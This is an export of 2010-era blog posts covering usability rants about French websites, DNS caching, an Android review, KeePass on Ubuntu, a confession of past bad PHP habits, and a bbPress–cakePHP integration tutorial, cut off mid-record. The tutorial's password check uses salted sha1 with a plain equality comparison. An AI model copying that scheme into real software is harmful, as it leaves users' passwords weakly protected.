  "text": "<blockquote>\n<p>Physics is just reverse-engineering the world</p>\n</blockquote>\n<p>I once heard or read that somewhere and that make me smile.</p>\n<p>Today I wondered if the same analogy could be applied to the other subjects we are teached in school.</p>\n<p>If Physics is reverse-engineering, then Mathematics is using the World framework and developping new applications and unit testing with it.</p>\n<p>Biology would be micro-debugging and desassambling it, maybe even re-compiling it.</p>\n<p>History would be nothing more than writing and parsing the logs.</p>\n<p>Geography would be mapping the whole network.</p>\n<p>French (or English, or whatever your first language is) would be reading and learning the doc and man pages. And of course, foreign languages would mean learning new programming languages.</p>\n<p>Sports would be the fun part, where you are playing you video games.</p>\n<p>Did I forgot something ?</p>",
  "publish_start": "2010-02-04 16:47:59",
  "slug": "what-would-we-be-studying-if-our-world-was-a-software"
}, {
  "id": 38,
  "name": "Ergonomie Fail : Commander en ligne chez But",
  "text": "<p>Le week-end dernier j'ai vu un joli petit bureau dans un magasin But. Je n'étais pas sur des dimensions chez moi et je ne l'ai donc pas acheté sur place en me disant que je pourrai le commander sur Internet plus tard si j'avais effectivement la place de le mettre chez moi.</p>\n<p>De retour chez moi et une fois les mesures prises, c'est bon, le bureau tiens parfaitement, je vais donc sur le <a href=\"http://www.but.fr/\" title=\"But\">site de But</a> pour le commander. Je <a href=\"http://www.but.fr/produits/26418/Bureau-droit-CYCLO-1113-Blanc.html\" title=\"Bureau Cyclo\">le trouve facilement</a>, je l'ajoute à mon panier, je valide mon panier et là, la galère commence.</p>\n<p>But me demande d'indiquer mon code postal pour voir le magasin le plus proche pour me livrer. Pas de problème. Je termine ma commande (en acceptant les CGV) et là il me demande mon login/pass ou de me créer un compte si je n'en ai pas.</p>\n<p>Va pour la seconde solution. Nom, prénom, etc... Ca commence à se gater pour le code postal et la ville. Il y a un auto-complete sur le code postal censé remplir automatiquement la ville mais il n'est pas complétement au point, j'ai du recommencer 2 fois. Bref, ça fini par passer.</p>\n<p>Je mets mon mail, mon mot de passe, décoche les newsletters et c'est parti.</p>\n<p>Ok... J'arrive à nouveau sur la même page, avec mon formulaire tout vidé et aucun message de feedback... Ah, je remarque quand même un \"Bonjour M Timothée Carry\" en haut de la page, il semblerait que j'ai quand même été enregistré.</p>\n<p>Je remarque aussi un lien \"Mon espace client\" en haut, si je suis identifié, je devrait y trouver moyen de terminer ma commande.</p>\n<p>Ah, non. Ca me renvoie sur la même page d'authentification/inscription. Bon, si ca se trouve je suis inscrit, je vais tenter de me logguer avec le mail/pass que j'ai indiqué.</p>\n<p>Ah cool, ça marche... Bon heureusement que j'ai essayé mais rien que cela, ça aurait débouté plus d'un client potentiel.</p>\n<p>Bon, j'arrive donc sur le deuxieme étape de ma commande, celle où je dois indiquer mes coordonées de livraison. Ce ne sont pas les même que l'adresse indiquée pour mon compte, je veux le faire livrer chez quelqu'un d'autre, on va l'appeller Mlle Anne Onyme. Heureusement il y a deux liens \"Modifier mes informations\" et \"Modifier mon adresse\". Je vais essayer le premier.</p>\n<p>Ca m'ouvre une lightbox avec un petit formulaire où je peux changer mon nom, prénom et téléphone. Hmm... C'est pas très clair si ca va changer les infos de mon compte ou celles de cette commande...</p>\n<p>En plus, les champs Téléphone et N° de carte But sont pre-rempli par ce qui semble etre un caractère ASCII nul (0000). Pas très pro ça.</p>\n<p style=\"text-align: center;\"><img src=\"/files/2010/02/07/4b6ec6be99207.jpg\" alt=\"But : Changer infos personnelles\" width=\"562\" height=\"366\" /></p>\n<p>Bon, je change le nom et prénom pour mettre ceux de la personne à qui je veux l'envoyer et je valide.</p>\n<p>Oups... erreur. Il semblerait que les numeros de téléphone ne soient pas valides... Bizarre, je n'avais pas mis de numero lors de mon inscription et il n'avait pas crié au scandale pour autant.</p>\n<p style=\"text-align: center;\"><img src=\"/files/2010/02/07/4b6ec751d2296.jpg\" alt=\"But Changer infos personnelles\" width=\"592\" height=\"474\" /></p>\n<p>Bon, je vais jouer le jeu et mettre un numero de tel, mais je ne sais pas lequel mettre. Le mien ou celui de la personne à qui je fais livrer. Je veux livrer cela comme un cadeau, donc je ne veux pas qu'ils l'appellent avant pour mettre au point les détails de la livraison, je devrai donc mettre le mien comme numero. Pas très clair cette histoire, ils devraient indiquer à qui sert ce numero.</p>\n<p>Bon, j'indique mon numero de portable et je valide. Aucune réaction. Je valide à nouveau : rien. Je lance Firebug et regarde les requetes AJAX. Ah, ils envoient un check au serveur pour valider et apparemment j'ai toujours des erreurs. Ergonomie fail une fois de plus. Ils auraient du mettre un petit loading le temps qu'ils fassent cette requete parce que à j'ai une erreur, mais j'ai l'impression que rien n'a changé.</p>\n<p style=\"text-align: center;\"><img src=\"/files/2010/02/07/4b6ec816eb6b0.jpg\" alt=\"But : Validation firebug\" width=\"767\" height=\"191\" /></p>\n<p>Bon, j'imagine que c'est parce que j'ai des champs ASCII nuls qu'il déconne. J'ai la chance d'etre sous Firefox et que ces champs ASCII soient symbolisés, j'imagine qu'un internaute sous IE n'aurait rien compris du tout.</p>\n<p>Je revalide... Rhooo. Encore une erreur ! J'ai indiqué mon numero de téléphone en séparant chaque groupe de deux chiffres(06 12 34 56 78) et ça passe pas sa validation... Ca c'est clairement le genre de check coté serveur qui peut être fait en une ligne de code, supprimer les espaces, et valider le nouveau numero de téléphone. Ca devrait etre au serveur de faire ce travail, pas au client d'entrer son numero de téléphone de facon formattée (ou alors, que AU MOINS, on m'indique le format attendu).</p>\n<p>Bref, je ré-ecrit mon téléphone de façon agglutinée (0612345678) (tout en me disant que cette validation exclut le format international (+33)6xxxx )</p>\n<p>Ahhhh, cette fois, ça passe. C'est bon, mes infos personnelles sont modifiées. Uhh... Je remarque alors une chose étrange. Le message de bienvenue est devenu \"Bonjour Mlle Anne Onyme\"... Cela veut dire que j'ai changé les infos de mon compte plutot que celle de l'adresse de livraison ? <em>Quoi la baise?!!? </em>comme on dit.</p>\n<p>(Juste par acquis de conscience, j'ai voulu ré-editer mes infos personnelles aussitot, et comme je m'y attendais, la pop-up contenait encore mes anciennes infos... Enfin bon)</p>\n<p>Bref, bon, je suis plus à ça près. Je continue et modifie mon adresse.</p>\n<p>Même chose que tout à l'heure, les champs vides sont remplis par un code ASCII nul... Je suis sur que ca va faire bugguer leur validation, donc je les vide réellement et je mets l'adresse de livraison.</p>\n<p>Ah ! Cette fois-ci j'ai droit à un joli loading en gif le temps qu'il fasse sa validation. Cool. On dirait qu'ils m'ont entendu. Je ne comprends pas trop pourquoi il est présent sur l'une des lightbox et pas sur l'autre mais passons. Peut-être que je ne l'avais pas vu la première fois ?</p>\n<p>Allez, je suis maso, je vais retourner voir la première lightbox pour vérifier si elle ne m'a pas échappée.</p>\n<p>Mais argh ! Le récapitulatif de mon adresse a un problème d'encodage... Ma jolie adresse de \"10 rue des la crèpe au sucre\" est devenue \"10 rue de la crÃ¨pe au sucre\".</p>\n<p style=\"text-align: center;\"><img src=\"/files/2010/02/07/4b6ec6ad83d2e.jpg\" alt=\"But : Adresse utf8\" width=\"354\" height=\"84\" /></p>\n<p>Petit coup d'oeil aux headers HTTP et à la source pour voir l'encoding spécifié. C'est en iso-8859-1 dans les deux. Au moins ils sont constants, mais ils doivent avoir un problème d'utf8 autre part sur leurs scripts serveurs.</p>\n<p style=\"text-align: center;\"><img src=\"/files/2010/02/07/4b6ec6e42c54a.jpg\" alt=\"But : Headers HTTp\" width=\"591\" height=\"145\" /></p>\n<p style=\"text-align: center;\"><img src=\"/files/2010/02/07/4b6ec6fd7a309.jpg\" alt=\"But : Source html\" width=\"681\" height=\"52\" /></p>\n<p><em>Au passage on remarque dans les headers un X-Cnection: close assez suspect, il faudra que je me renseigne là dessus.</em></p>\n<p>Bon, bref, un probleme d'encodage, c'est assez commun. Je voulais re-modifier mes coordonnées pour vérifier la présence du loading. Je ré-ouvre donc la lightbox. Les champs vides sont encore redevenus des ASCII nul et me font encore casser la validation. Bref, je revalide et non vraiment, il n'y a pas de loading, j'avais bien vu...</p>\n<p>Je retourner éditer mon adresse, je veux vérifier les headers retournés par AJAX, si ça se trouve le problème d'encoding vient de là.</p>\n<p>Hmm. Leur façon de faire de l'ajax est pour le moins... spéciale. Une fois que la validation (en AJAX) a fonctionnée, ils reloadent la page html complétement... Ca sent vraiment l'AJAX rajouté en dernière minute parce que c'est <em>hype</em>, mais sans trop comprendre à quoi ça sert...</p>\n<p>Donc, groumpf, je re-recommence, en activant le mode \"Persist\" de Firebug pour pouvoir traquer les connections même après le reload. Bon, il s'avère que la réponse du serveur n'a pas de charset spécifié dans ses headers, mais comme tout le page est reloadée je ne peux pas dire d'où vient le soucis. Peut-être l'adresse est-elle mal enregistrée dans la base de donnée tout simplement.</p>\n<p>Bon, et je me suis arreté là et ai choisi d'aller acheter mon meuble directement dans un magasin car clairement leur site n'a fait l'objet d'aucune étude ergonomique.</p>\n<p> </p>",
  "publish_start": "2010-02-07 14:56:21",
  "slug": "ergonimie-fail-commander-en-ligne-chez-but"
}, {
  "id": 39,
  "name": "Ergonomie Fail : Gérer son nom de domaine chez Orange Business Service",
  "text": "<p>Et c'est reparti pour un tour. Cette fois, j'ai besoin de modifier certains paramètres techniques d'un nom de domaine enregistré chez Oléane (devenu Orange Business Services).</p>\n<p>J'avais déjà eu affaire à eux dans le passé et pour modifier les adresses DNS du serveur j'avais du leur envoyer un fax (<em>Un fax, non mais des fois, faut vraiment qu'ils aillent mal</em>)</p>\n<p>Bref, aujourd'hui je dois y retourner et je me souviens pourquoi j'avais un mauvais souvenir de <a href=\"https://clients.fr.oleane.com/\" title=\"Orange Business Service\">leur interface</a>.</p>\n<p>Déjà, on m'accueille avec un message que je ne pensais plus revoir sur le net depuis 10 ans :</p>\n<p style=\"text-align: center;\"><img src=\"/files/2010/02/08/4b701a583f287.jpg\" alt=\"Oleane : optimisation\" width=\"483\" height=\"125\" /></p>\n<p>Il y a une checkbox sur le formulaire de login, avec la mention \"mémoriser ce compte\" mais bien sur, pas de &lt;label&gt; sur le texte, je dois donc cliquer sur la checkbox plutot que sur le texte pour la cocher. C'est bête, c'est pas grand chose, mais ça change quand même la vie.</p>\n<p style=\"text-align: center;\"><img src=\"/files/2010/02/08/4b701b18dc11c.jpg\" alt=\"Oleane : label\" width=\"687\" height=\"83\" /></p>\n<p>Je valide quand même et là ça s'enchaine, la connection (en https://) n'est pas sécurisé selon Firefox... Ca donne drolement confiance en leur service ça...</p>\n<p style=\"text-align: center;\"><img src=\"/files/2010/02/08/4b701b6d2a6d2.jpg\" alt=\"Oleane : unsecure connection\" width=\"508\" height=\"109\" /></p>\n<p>Ok, c'est bien parce que je sais qu'ils sont plus incompétents que méchants que je passe quand même.</p>\n<p>Et là, deuxième horreur que je ne pensais pas revoir sur le net d'aujourd'hui... Des gifs animés clignotants. Argh mes yeux... Mon dieu... <img src=\"/files/2010/02/08/4b701bf7b501e.gif\" alt=\"Oleane : gif\" width=\"14\" height=\"14\" /><img src=\"/files/2010/02/08/4b701bf7b501e.gif\" alt=\"Oleane : gif\" width=\"14\" height=\"14\" /><img src=\"/files/2010/02/08/4b701bf7b501e.gif\" alt=\"Oleane : gif\" width=\"14\" height=\"14\" /></p>\n<p>Bon, j'arrive quand même sur l'interface. J'y allais à la base pour y retrouver la configuration du domaine pour recréer la même une fois que je l'aurai transféré. Il me fallait aussi la liste des mails, vu que je vais changer de serveur mail, je vais devoir recréer la liste.</p>\n<p>Heureusement, je trouve assez facilement, et ils ont une interface plutot réussi cette fois-ci. Présentée comme un carnet d'adresse où je peux voir toutes les adresses mails créés et les redirections actives. Cool.</p>\n<p>Il y a même un bouton \"Import export\". J'imagine que c'est pour exporter ou importer des listes de contacts (en *.csv ou autre) et n'a rien à voir avec du commerce étranger, je clique donc dessus et ...</p>\n<p style=\"text-align: center;\"><img src=\"/files/2010/02/08/4b701cfa21124.jpg\" alt=\"Oleane : erreur export\" width=\"562\" height=\"123\" /></p>\n<p>Ah, hmm ok. Au temps pour moi, je suis bon pour le faire à la main à ce que je vois...</p>\n<p>Il y a une fonction \"Imprimer\", je vais quand même essayer cela. Ah cool, ça marche, ça me donne une liste de tous les users avec leurs mails, de façon claire et lisible. Parfait.</p>\n<p>Je cherche un peu pour trouver les options d'administration DNS du domaine, mais rien. Apparamment, je ne peux que éditer ce qui a trait à la messagerie, je parie que pour les DNS je vais encore devoir envoyer en fax.</p>\n<p>Tant pis, de toutes façons, le nom de domaine a été migré chez Gandi, tout sera bien plus simple là bas.</p>",
  "publish_start": "2010-02-08 14:57:10",
  "slug": "ergonomie-fail-gerer-son-nom-de-domaine-chez-orange-business-service"
}, {
  "id": 40,
  "name": "DNS caching and flushing",
  "text": "<p>Yesterday I moved this domain from one server to another on my Dreamhost account (actually, I moved the whole domain from one Dreamhost account to another, but that's the same).</p>\n<p>The DNS saved at the registrar where the same (<code>ns1.dreamhost.com</code>, <code>ns2.dreamhost.com</code> and <code>ns3.dreamhost.com</code>). The transfer went seamlessly and I was able to access my website on the new server in an invisible way.</p>\n<p>But, strangely, some hours laters I started to experience slow down when accessing the website and finaly all my requests timed out, be it either from Firefox or a direct ping.</p>\n<p>I tried with my windows xp and my Ubuntu 8.04. I even change the DNS on xp to use opendns, run an <code>ipconfig /flushdns</code>, rebooted. On Ubuntu I've done a <code>/etc/init.d/dns-clean start</code>. I even rebooted my adsl box, thinking there was something wrong with the DNS cache on my side.</p>\n<p>I even contacted both Dreamhost and Gandi with a complete traceroute to know if they could help me, as I thought having done everything that I could think of to resolve the issue. They assure me that their configuration was fine and the problem wasn't on their side.</p>\n<p>When asking friends, or testing with <a title=\"http://downforeveryoneorjustme.com/\" href=\"http://downforeveryoneorjustme.com/\">http://downforeveryoneorjustme.com/</a> it occured that the problem really was on my side.</p>\n<p>Everyone were true. The problem lied somewhere in between, in the DNS cache hold by my ISP that wasn't correctly up to date. I don't really understand how that could happen, I thought rebooting my Freebox would clear its cache, and specifying dns addresses of opendns would bypass the dns resolve of my ISP but it seems not to be the case.</p>\n<p>Anyway, after waiting for some more hours, my website was again reachable through <code>ssh </code>and <code>ftp</code>.</p>\n<p>So, if you're sure your dns configuration is correct both on your register and on your hosting service, make sure to clear every DNS cache you can have on your own side. That include windows inner dns cache, those of your browser, those of your router, and those of your specified preferred DNS resolving server.</p>\n<p>If all that failed, it should be caching issue with your ISP, and there is nothing you can do about that, except waiting.</p>",
  "publish_start": "2010-02-09 16:23:54",
  "slug": "dns-caching-flushing"
}, {
  "id": 182,
  "name": "First impressions on my Android powered HTC Legend",
  "text": "<p>I recently bought an HTC Legend. My old phone was broken and I have plans to develop an Android app. I've been using the phone for 3 weeks now, and I'm not exactly as thrilled about it as I think I would.</p>\n<h4>Open source from Big Brother</h4>\n<p>I was hoping to have a little piece of open source software in my pocket. In fact, it turns out that Google has a little more piece of me when I'm using the phone.</p>\n<p>The software is not that open. Maybe it's because of my phone carrier, SFR, but there are a lot of pre-installed and useless apps that I can't get rid of.</p>\n<p>Some settings can't even be changed because I'm only a user of my own phone and don't have a root access by default. The \"Accessibility\" setting panel is a joke (I'll post a picture of it later)</p>\n<p>When I first switched the phone on, I was asked for my Google credentials. Once entered, all my Google life was downloaded to the phone : mail address book, google maps location and google calendar meetings. Asking first if I wanted that would have been great.</p>\n<p>Because loading 500+ mails address book into a phone memory is not the kind of \"smart\" I was expecting from a smart phone. I had to manually remove all the contacts I needed not from my phone.</p>\n<p>And then the phone was complaining again, when it tried to synchronize back with Gmail, when it tried to remove the mails from my online address book.</p>\n<p>I didn't want them downloaded in the first place and once I removed them I didn't want them to be deleted from my online address book !</p>\n<h4>Disabling sync</h4>\n<p>So I tried to remove the google account from my phone, but that is clearly impossible and is NEEDED to make the phone work. What ? This is stupid.</p>\n<p>I'm not confortable with having a device from which I can't even remove my credentials... At least I disabled the auto-sync feeature.</p>\n<p>An other thing to note is that if you want to fine-tune what kind of data your phone syncs, you first have to enable the auto-sync feature and quickly disable the data you don't want, because they all are checked by default.</p>\n<h4>Other settings</h4>\n<p>Even changing the default ringtone is a chore. There's no way to easily select a music file saved on the SD card. There isn't even a native file explorer, you have to download one from the Market.</p>\n<p>The camera quality isn't very good and the auto-focus makes pictures more blurry with it than without. Even my old Nokia XpressMusic was taking better shots.</p>\n<h4>Conclusion</h4>\n<p>I really am disapointed by this phone actually, and by the Android platform as a whole. Maybe the underlying app is great but as an end-user we are blocked from it.</p>\n<p>I'll try to root my device and remove the SFR rom to get what I want and need.</p>",
  "publish_start": "2010-06-10 03:31:00",
  "slug": "first-impressions-on-my-android-powered-htc-legend"
}, {
  "id": 183,
  "name": "MySQL Error 1577 on Dreamhost",
  "text": "<p>Recently, when connecting to my MySQL databases on Dreamhost through Navicat, I was greeted with a \"<code>1577 - Cannot proceed because system tables used by Event Scheduler were found damaged at server start</code>\" error message.</p>\n<p>It didn't stop me from accessing the tables actually, so I didn't bother. But today it prevent me from copying tables from one server to another, so I decided to have a deeper look into it.</p>\n<p>It seems that it has to do with a mysql upgrade issue. I contacted Dreamhost about that and they told me that they just upgraded their servers to 5.1, and that they needed to be restarted. Which they do for me.</p>\n<p>So if you ever run into the same problem, just contact Dreamhost support and they'll fix it for you.</p>",
  "publish_start": "2010-06-10 08:11:00",
  "slug": "mysql-error-1577-on-dreamhost"
}, {
  "id": 266,
  "name": "Migrating from Windows to Ubuntu : KeePass",
  "text": "<p>I'm slowly trying to move my development machine from a desktop Windows Xp to a laptop running Ubuntu. This is quite a long task because there are so much softwares I depend on on my day to day work. Most of them are crossplatform but I often need o find a Ubuntu equivalent, and sometimes it does not exists and I have to run the Windows app using an emulator.</p>\n<p>This is exactly the case with <a title=\"KeePass\" href=\"http://keepass.info/\" target=\"_blank\">KeePass</a>. KeePass 2.0 is an improved version of KeePass 1.0 (obviously), that allows one to save all password in one place. The 2.0 version also permit to save more than single password, virtually anything, and adding little icons to each entry (when you start having 200+ entries, icons are a must have).</p>\n<h4>Enter Ubuntu world</h4>\n<p>The official 2.0 version is not supported under linux. There is a linux port, named <a title=\"KeePassX\" href=\"http://www.keepassx.org/\" target=\"_blank\">KeePassX</a>, but it does not support the <code>.kdbx</code> file format used by the official 2.0 version.</p>\n<p>So I tried to run the Windows <code>.exe</code> file with Wine at first (I already had Wine installed to run another app), but it wasn't working with KeePass. I tried instead an other emulator, Mono, and running <code>mono KeePass.exe</code> totally worked.</p>\n<h4>Little tweaks ahead</h4>\n<p>First of all, I had to install two additionnal packages to make it open without errors : <code>System.Windows.Forms</code> and <code>System.Runtime</code>. So far, so good.</p>\n<p>But, I quickly discovered that one of the most usefull features of KeePass, auto-type (Ctrl+V automatically fills a login/password field) wasn't working correctly. There was one more missing dependency : <code>xdotool</code>.</p>\n<p>If you are running Ubuntu like me, do not install it from the official packages, this version is completly outdated and won't work. Instead, you have to manually install the latest version. If you are lucky and running a 64bits system, you can download directly <a title=\".deb file for xdotool on 64bits system\" href=\"http://code.google.com/p/semicomplete/downloads/list?can=2&amp;q=label%3A.deb+label%3Axdotool+label%3Afeatured&amp;colspec=Filename+Summary+Uploaded+ReleaseDate+Size+DownloadCount\" target=\"_blank\">the .deb file from here</a>.</p>\n<p>If you are running under a 32bits system like me, you'll have to manually install it. First grab <a title=\"xdotool for 32bits\" href=\"ttp://code.google.com/p/semicomplete/downloads/list?q=label:xdotool\" target=\"_blank\">the files from this link</a>. Then, install the <code>libxtst-dev</code> package (it is needed for the install to complete), export the content of the <code>.tar.gz</code> file into a temporary directory and execute <code>sudo make install</code>.</p>\n<h4>Finally !</h4>\n<p>Now, you got KeePass 2.0 working under Ubuntu, and installed all dependencies needed to run the auto-type feature.</p>\n<p>In a Windows environment, one can change KeePass preferences so that closing it only send it to the tray bar.This option does not seem to be working under Linux, KeePass still shows in the task bar even when minimized. I spent some time trying to fix that too, tetsing AllTray and other tray softs for linux but didn't managed to get what I wanted.</p>",
  "publish_start": "2011-03-05 14:40:48",
  "slug": "migrating-windows-ubuntu-keepassah"
}, {
  "id": 45,
  "name": "Reading my own code from 3 years ago",
  "text": "<p>Today I had to update an old site I developped some years ago. I had to move it from one host to another and make sure all the configuration followed.</p>\n<p>It scares me. What I wrote 3 years ago scares me. My code was... well there was some huge mistakes, things I would never ever do again. Today, I would severly frown upon any coder who wrote horribles things like that.</p>\n<p>For the php part, here is a very good list of what NOT to do :</p>\n<ul>\n<li>I used shorthand notation for my php tags : &lt;? instead of &lt;?php.</li>\n<li>My server was set as register_global off, but I was circumventing it by doing my own register_global on :<br />\n<pre lang=\"php\">extract($_SERVER);<br />extract($_COOKIE);<br />extract($_GET);<br />extract($_POST);</pre>\n</li>\n<li>My files were encoded in Latin-1, my database was in latin1_swedish_ci and my html head was set to iso-8859-1. At least, that was consistent.</li>\n<li>I wasn't EVER testing if my variables were set, so I had notices popping everywhere. I had the error_reporting set to disable them, hiding the error instead of writing better code.</li>\n<li>The password of my users were stored UNCRYPTED in the database... And stored uncrypted in the cookie as well.</li>\n<li>I was doing something that was supposed to be OOP, but I never used heritage, so all my classes were containing the same methods, copied and pasted from one file to another, and changing only some variable names...</li>\n</ul>\n<p>And some other mistakes :</p>\n<ul>\n<li>I included a whole bunch of Javascript files (like 15 or so) and was NOT using any js framework. Well, technically I was using a js framework, but one I developped. And let be honest, I can't really call it a framework today.</li>\n<li>I used letter-spacing:-1000em to hide text (when using an image as a header for example). It broke on Firefox, I'm now using text-indent:-1000em; (really, I don't know if this is better).</li>\n<li>There was a flash animation with sound, enabled by default and with auto-play. For my defense, I remember having told by ex boss that it was a bad idea but he insisted.</li>\n</ul>\n<p>To be honest a part of me is horrified of what I wrote some years ago and thought was great. On the other hand, I'm quite proud of the progress I have made in so little time.</p>",
  "publish_start": "2010-02-15 20:54:29",
  "slug": "looking-at-my-own-code-4-years-ago"
}, {
  "id": 46,
  "name": "Integration of a bbPress forum into a cakePHP application (part 1)",
  "text": "<p>Today I had to integrate a forum into an existing cakePHP app. I didn't want to code the whole thing from scratch and wanted to take advantage of one of the great opensource forums out there instead.</p>\n<p>I wanted to keep the forum as a stand-alone part, with its own admin panel, and not mess with its core files, to allow me the possibility of updating it if needed. But I didn't want my user to register twice, for my app and for the forum, I wanted the whole register/login thing to be as smooth as possible.</p>\n<p>After some trials, I finally choose bbPress, from the makers of WordPress.</p>\n<p>I took me some time, digging into the online documentation (pretty much non-existent), digging into existing plugins and the source code to finally script what I needed. I had to code a cake behavior, a cake component, a bbPress plugin, overwriting some bbPress functions but it finally works.</p>\n<h4>Installing bbPress on a cakePHP app</h4>\n<p>First thing you need to do is installing bbPress. Just drop the files you downloaded into <code>app/webroot/forum</code> and follow the installation instruction. Set the admin login the same as your own admin login in your app. Type anything you want for the password, we'll change that later.</p>\n<p>Once this is done, you should have a working forum, and being able to access it on <code>/forum</code>. It's a good start, isn't it ?</p>\n<p>Now, open your favorite mysql editor (Navicat or phpmyadmin) and connect to your database. Make sure the collation of the <code>bb_ tables</code> are the same as the collation of your cake tables. It will allow them to correctly communicate. My cake tables were set to <code>utf8_unicode_ci</code> and my bbPress tables were set to <code>utf8_general_ci</code>. I had to update all the bbPress tables to make sure no collation problems arise.</p>\n<h4>Using the same password hashing</h4>\n<p>Now let's look at our bb_users table. You should have one entry for your admin account. Go to your own cake <code>users </code>table, copy your password hash and paste it in place if the bbPress one. Cake and bbPress do not use the same hashing algorithm, so we are going to change that.</p>\n<p>Open <code>forum/bb-config.php</code> and add the following code :</p>\n<pre lang=\"php\"><code lang=\"php\">define('CAKE_SALT', \"XXXXX\");<br />// Check password using sha1<br />function bb_check_password( $password, $hash, $user_id = '' ) {<br /> \t// Does it match ?<br />\treturn sha1(CAKE_SALT.$password)==$hash;<br />}</code></pre> <p>Of course, replace the <code>XXXXX </code>value of <code>CAKE_SALT</code> with your own <code>Security.Salt</code> value (usually found in <code>app/config/core.php</code>). Also note that the default hashing method used by cake is <code>sha1</code>, but if you use an alternate <code>md5 </code>or <code>sha256</code>, you'll have to update the method above.</p>\n<p>Doing all this, we change the way bbPress checks for a valid password. The method gets the plain password and the hashed version stored in the database and compare them. Cake does its comparison using its own internal salt value and applying <code>sha1()</code> on it. We just do the same here. That way, we can now login using the same password.</p>",
  "publish_start": "2010-02-17 17:36:00",
  "slug": "integration-a-bbpress-forum-into-a-cakephp-application-part-1"
}, {
  "id": 47,
  "name": "Integration of a bbPress forum into a cakePHP application (part 2)",
  "text": "<p>We've done enough work on the forum for now. The time has come to edit our cake files.</p>\n<h4>Creating the cakePHP models</h4>\n<p>We will create two models to help in speaking with the bbPress database.</p>\n<p>Create a bb_usermeta.php model :</p>\n<pre lang=\"php\"><code lang=\"php\">class BbUsermeta extends AppModel {<br />\tvar $useTable = 'bb_usermeta';<br />\tvar $primaryKey = 'umeta_id';<br />}</code></pre>\n<p>Create a <code>bb_user.php</code> model :</p>\n<pre lang=\"php\"><code lang=\"php\">class BbUser extends AppModel {<br />\tvar $primaryKey = 'ID';<br /><br />\tvar $hasMany = array(<br />\t\t 'BbUsermeta' =&gt; array(<br />\t\t\t 'className' =&gt; 'BbUsermeta',<br />\t\t\t 'foreignKey' =&gt; 'user_id',<br />\t\t\t 'dependent' =&gt; true<br />\t\t)<br />\t );<br /><br />\t//We make sure, before saving, that the nicename is url-friendly<br />\tfunction beforeSave() {<br />\t\tif (!empty($this-&gt;data[$this-&gt;name]['user_nicename'])) {<br />\t\t\t$this-&gt;data[$this-&gt;name]['user_nicename'] = Inflector::slug($this-&gt;data[$this-&gt;name]['user_nicename']);<br />\t\t}<br />\t\treturn true;<br />\t}<br /><br />}</code></pre>\n<p>So, what was that about ?</p>\n<p>We created two models to communicate with bbPress. bbPress stores user-related information in <code>bb_users</code> as well as <code>bb_usermeta</code>. We defined the <code>$primaryKey</code>, <code>$useTable</code> and <code>$foreignKey</code> of the <code>$hasMany</code> because the bbPress tables do not follow the cakePHP convention.</p>\n<p>We also add a nifty <code>beforeSave()</code> method to <code>BbUser </code>to make sure its <code>user_nicename</code> (used as an url slug) is url-friendly.</p>\n<h4>How to save bbPress users from the cakePHP app</h4>\n<p>Great. Now you can easily add, edit and delete users from bbPress directly from your app.</p>\n<p>There are some things you should know about before doing that :</p>\n<ul>\n<li><code>first_name</code> and <code>last_name</code> are stored in <code>bb_usermeta</code></li>\n<li>the access rights are defined in <code>bb_usermeta</code> too, using the <code>bb_capabilities</code> key</li>\n</ul>\n<p>Now that you know all that, you can easily create a behavior creating a new bbPress user when creating a new user, deleting that bbPress user when deleting the main user and updating the bbPress user when updating the main user.</p>\n<p>I myself wrote this behavior, but as it is part of a more general bbPress plugin it may not work as-is. I'll try to publish it if anyone is interested.</p>",
  "publish_start": "2010-02-17 17:51:14",
  "slug": "integration-a-bbpress-forum-into-a-cakephp-application-part-2"
}, {
  "id": 48,
  "name": "Integration of a bbPress forum into a cakePHP application (part 3)",
  "text": "<p>Let's go back to bbPress now. With the previous post, you should be able to create bbPress user directly from your app.</p>\n<h4>Redirecting bbPress to the cakePHP app actions</h4>\n<p>What we'll be doing now is adding some hooks on every user-related action on bbPress to redirect them to their equivalent in your app. No need to have two different login form, hey ?</p>\n<p>Create a new php file in your <code>app/webroot/forum/my-plugins/</code> directory, and copy and paste the following code :</p>\n<pre lang=\"php\"><code lang=\"php\">/*<br />Plugin Name: cakePHP User<br />Description:  Remaps each login/register/forgotpass action to those of your own application<br />Version: 0.1<br />Author: Pixelastic<br />Author URI: http://www.pixelastic.com/<br /><br />License: CC-GNU-GPL http://creativecommons.org/licenses/GPL/2.0/<br /><br />*/<br /><br />define( 'APP_URL', 'http://www.myapp.com/' );<br />/**<br /> *    __convertToAppUrl<br /> *    Convert a given bbPress URI to one mapped to the main application<br /> **/<br />function cake_convertToAppUrl($uri) {<br />\t // We explode the path in different subdirs<br />\t $paths = explode('/', $uri);<br />\t $nbrPath = count($paths);<br /><br />\t // We get the last part of the url<br />\t $endUri = substr($uri, strrpos($uri, \"/\")+1);<br /><br />\t $mappedUrl = array(<br />\t\t // Register<br />\t\t 'register.php' =&gt; 'users/add',<br />\t\t // Lost password<br />\t\t 'password-reset.php' =&gt; 'users/pass',<br />\t\t // Login<br />\t\t 'bb-login.php' =&gt; 'users/login',<br />\t\t // Logout<br />\t\t 'bb-login.php?action=logout' =&gt; 'users/logout',<br />\t\t // Profile editing<br />\t\t 'edit' =&gt; 'users/edit/'.$paths[$nbrPath-2]<br />\t );<br /><br />\t // If there is a mapping, we return it, otherwise we don't touch the uri<br />\t return (!empty($mappedUrl[$endUri])) ? APP_URL.$mappedUrl[$endUri] : $uri;<br />}<br />// We filter both bb_uri and bb_get_uri<br />add_filter('bb_uri', 'cake_convertToAppUrl', 1);<br />add_filter('bb_get_uri', 'cake_convertToAppUrl', 1);</code></pre> <p>It will hook every method that ask for a url and convert the result to return the corresponding url in your own app.</p>\n<p>Don't forget to enable this plugin in your bbPress admin panel.</p>\n<p>Of course, feel free to change the destination url to reflect those of your app.</p>\n<h4>Additional information</h4>\n<p>Note that the<code> users/edit/ </code>method takes the bbPress <code>nicename </code>as argument, so you should have to convert it before displaying the edit form.</p>\n<p>I also edited my template and added an hidden field in the bbPress login form to check if the login was coming from the app or the forum and redirect accordingly.</p>",
  "publish_start": "2010-02-17 17:59:00",
  "slug": "integration-a-bbpress-forum-into-a-cakephp-application-part-3"
}, {
  "id": 49,
  "name": "Integration of a bbPress forum into a cakePHP application (part 4)",
